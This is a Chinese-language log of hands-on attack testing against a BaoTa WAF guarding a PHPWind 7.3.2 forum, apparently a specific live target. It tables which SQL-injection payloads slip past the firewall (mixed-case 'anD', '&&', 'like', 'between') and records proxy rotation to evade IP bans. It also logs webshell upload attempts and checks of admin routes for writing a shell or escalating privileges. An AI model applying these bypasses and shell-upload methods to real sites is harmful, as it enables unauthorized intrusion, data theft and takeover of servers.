# 宝塔 WAF 9.8.9 在 PHPWind 7.3.2 上的拦截边界（实测）

## 一、IP 层（最高优先级结论）
- 触发方式：连发 /.env、/.git/config、/www.zip 等敏感路径 → 宝塔 WAF 把源 IP 加入**全局**黑名单
- 表现：80 端口返回 `HTTP/1.1 444`（无 body，带 `Set-Cookie: server_session_<8hex>=...`）；443 端口 **TLS 握手成功但 HTTP 响应 0 字节**（连接被断）
- **关键判据：这不是 vhost 级、也不是域名级**
  - 空 SNI / 假域名 SNI / 真域名 SNI / 换同机其它域名 → 全部 0 字节
  - 80 端口对任意 Host → 全部 444
- **不是 Windows schannel 缺陷**：Python(OpenSSL) 直连同样 0 字节；curl 的 `CRYPT_E_REVOCATION_OFFLINE` / `remote party requests renegotiation` 是另一回事
- **唯一有效绕过：换源 IP**（第三方 HTTP 代理即可，实测香港/国内代理访问 443 `/example.com` 返回 `200|3933`）
- 无效的伪造手段（全部实测 0 字节）：`X-Forwarded-For`、`X-Real-IP`、`Client-IP`、`True-Client-IP`、`CF-Connecting-IP`；HTTP/1.0；双 Host；无 Host；`space-before-colon`；tab 折行头；chunked；2000 字节长 URI
- 注意：888（宝塔 phpMyAdmin）与 27774（宝塔面板）端口的 server 块**不挂 WAF**，本机可直连

## 二、URL/参数层关键词边界（PHPWind 注入 payload 实测）
| payload 形态 | 结果 |
|---|---|
| `1 and 1=1`（全小写） | **403 网站防火墙** |
| `1 anD 1=1`（混合大小写） | **200 通过** |
| `1&&1=1` | **200 通过** |
| `1 like 1` | **200 通过** |
| `1 between 1 and 1` | **200 通过** |
| `1/**/and/**/1=1`（注释当空格） | 403 |
| `1%09and%091=1`（Tab 当空格） | 403 |
| `1%0aand%0a1=2`（换行当空格） | 403 |
| `1/*!50000and*/1=1`（内联版本注释） | 403 |
| `1 xor 1` | 403 |
| 含 `select`（含 `SeLeCt` 混合大小写） | 403 |
| 含 `sleep(` / `benchmark(` | 403 |
| `%0d%0aand%0d%0a1=1`（CRLF 当空格） | 403 |
结论：**空格类变体（`/**/`、`%09`、`%0a`）一律被拦；`and` 只有"混合大小写 + 正常空格"能过；`select`/`sleep`/`xor`/`benchmark` 关键词无解**。

## 三、multipart 上传层（附件 getshell 实测）
| 上传形态 | 结果 |
|---|---|
| `plain.txt` + 纯文本内容 | **200 / 2969B** |
| 无文件、仅 multipart 字段 | **200 / 2969B** |
| `plain.php` + 纯文本内容 | **0 字节（拦）** |
| `plain.txt` + `<?php echo 1;?>` | **0 字节（拦）** |
| `img.jpg` + `<?php ...` | **0 字节（拦）** |
结论：**WAF 同时拦"filename 的 .php 扩展名"与"内容里的 PHP 代码特征"**。即使业务层白名单放开了 php（实测发帖页白名单含 php/php5/php3/php7/phtml），WAF 仍在网络层断连。
⚠️ 免费代理噪声大时 0 字节无法区分"WAF 断连"与"代理失效"（曾出现纯文本也 0 字节）→ **判据必须用同一代理连续做"纯文本基线 + 目标 payload"对照**。

## 四、该目标上附带确认的业务层卡点（非 WAF）
- 附件目录 `/www/wwwroot/<站点>/attachment/` **不可写**（业务层报「附件目录不可写(777)」）→ 即使 WAF 绕过也传不上
- 后台 `adminjob=table/database/bakup/optimize` 与 `rightset`、`hack`、`plugin` 均无权限（147xx 页）→ 后台 SQL 写马与自我提权均不可行